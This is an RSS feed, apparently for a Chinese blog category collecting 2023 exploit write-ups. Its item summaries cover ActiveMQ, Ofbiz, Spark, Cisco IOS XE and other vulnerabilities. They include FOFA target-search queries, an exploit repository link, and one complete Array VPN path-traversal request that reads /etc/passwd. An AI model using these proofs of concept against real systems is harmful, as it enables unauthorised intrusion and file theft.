@@ -1,0 +1,87 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>2023hw漏洞 - Category - Chinchin&#39;s blog</title>
+        <link>http://example.org/categories/2023hw%E6%BC%8F%E6%B4%9E/</link>
+        <description>2023hw漏洞 - Category - Chinchin&#39;s blog</description>
+        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</lastBuildDate><atom:link href="http://example.org/categories/2023hw%E6%BC%8F%E6%B4%9E/" rel="self" type="application/rss+xml" /><item>
+    <title>360 新天擎终端安全管理系统存在信息泄露漏洞</title>
+    <link>http://example.org/360-%E6%96%B0%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/360-%E6%96%B0%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</guid>
+    <description><![CDATA[360 新天擎终端安全管理系统存在信息泄露漏洞 1 GET /runtime/admin_log_confcache]]></description>
+</item>
+<item>
+    <title>360天擎 - 未授权与sql注入</title>
+    <link>http://example.org/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/360%E5%A4%A9%E6%93%8E-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5/</guid>
+    <description><![CDATA[360天擎 - 未授权与sql注入 FOFA语法 title=&quot;360新天擎&quot; 鹰图 web.title=&quot;360新天擎&]]></description>
+</item>
+<item>
+    <title>Apache ActiveMQ远程命令执行漏洞</title>
+    <link>http://example.org/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/apache-activemq%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
+    <description><![CDATA[Apache ActiveMQ远程命令执行漏洞 影响版本 1 2 3 4 5.18.0&lt;=Apache ActiveMQ&lt;5.18.3 5.17.0&lt;=Apache ActiveMQ&lt;5.17.6 5.16.0&lt;=Apache ActiveMQ&lt;5.16.7 5.15.0&lt;=Apache ActiveMQ&lt;5.15.15 fofa 1 app=&#34;APACHE-ActiveMQ&#34; &amp;&amp; port=&#34;61616&#34; ActiveMqRCE 有回显 1 https://github.com/Hutt0n0/ActiveMqRCE 11.16号新增有回显的命令执行exp 1 2 3 4 5 6 7]]></description>
+</item>
+<item>
+    <title>Apache Ofbiz XML-RPC RCE漏洞-CVE-2023-49070</title>
+    <link>http://example.org/apache-ofbiz-xml-rpc-rce%E6%BC%8F%E6%B4%9E-cve-2023-49070/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/apache-ofbiz-xml-rpc-rce%E6%BC%8F%E6%B4%9E-cve-2023-49070/</guid>
+    <description><![CDATA[Apache Ofbiz XML-RPC RCE漏洞-CVE-2023-49070 2020年，为修复 CVE-2020-9496 增加权限校验，存在绕过。2021年，增加 Filter 用于拦截 XMLRPC 中的恶意请求，存在绕过]]></description>
+</item>
+<item>
+    <title>Apache Spark命令执行漏洞（CVE-2023-32007）</title>
+    <link>http://example.org/apache-spark%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-32007/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/apache-spark%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-32007/</guid>
+    <description><![CDATA[介绍 Apache Spark是美国阿帕奇（Apache）基金会的一款支持非循环数据流和内存计算的大规模数据处理引擎。 Apache Spark 3.4.0之前版本存在命令注入漏]]></description>
+</item>
+<item>
+    <title>Apache-ActiveMQ-Jolokia-远程代码执行漏洞-CVE-2022-41678</title>
+    <link>http://example.org/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/apache-activemq-jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-41678/</guid>
+    <description><![CDATA[Apache-ActiveMQ-Jolokia-远程代码执行漏洞-CVE-2022-41678 影响范围 1 2 3 4 Apache ActiveMQ before 5.16.6 Apache ActiveMQ 5.17.0 before 5.17.4 Apache ActiveMQ 5.18.0 unaffected Apache ActiveMQ]]></description>
+</item>
+<item>
+    <title>Apache-Submarine-SQL注入漏洞CVE-2023-37924</title>
+    <link>http://example.org/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/apache-submarine-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-37924/</guid>
+    <description><![CDATA[Apache-Submarine-SQL注入漏洞CVE-2023-37924 Apache Submarine是一个端到端的机器学习平台，允许数据科学家创]]></description>
+</item>
+<item>
+    <title>Appium Desktop CVE-2023-2479漏洞</title>
+    <link>http://example.org/appium-desktop-cve-2023-2479%E6%BC%8F%E6%B4%9E/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/appium-desktop-cve-2023-2479%E6%BC%8F%E6%B4%9E/</guid>
+    <description><![CDATA[Appium Desktop CVE-2023-2479漏洞 appium-desktop 是 Appium 服务器的图形界面，也是一个应用程序检查器 由于用户输入审查不当，此软件包的受影响版本容易受到命令注入的]]></description>
+</item>
+<item>
+    <title>Array VPN任意文件读取漏洞</title>
+    <link>http://example.org/array-vpn%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/array-vpn%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</guid>
+    <description><![CDATA[Array VPN任意文件读取漏洞 fofa 1 product=&#34;Array-VPN&#34; poc 1 2 3 4 5 6 7 8 9 10 GET /prx/000/http/localhost/client_sec/%00../../../addfolder HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd Dnt: 1 Upgrade-Insecure-Requests: 1 Connection: close]]></description>
+</item>
+<item>
+    <title>Cisco IOS XE CVE-2023-20198权限提升漏洞</title>
+    <link>http://example.org/cisco-ios-xe-cve-2023-20198%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/</link>
+    <pubDate>Fri, 08 Dec 2023 01:08:29 &#43;0800</pubDate>
+    <author>Chinchin</author>
+    <guid>http://example.org/cisco-ios-xe-cve-2023-20198%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/</guid>
+    <description><![CDATA[Cisco IOS XE CVE-2023-20198权限提升漏洞 poc 请参阅下面的示例请求，该请求绕过易受攻击的 IOS-XE 实例的身份验证。此 POC 创建一个名为baduser权]]></description>
+</item>
+</channel>
+</rss>
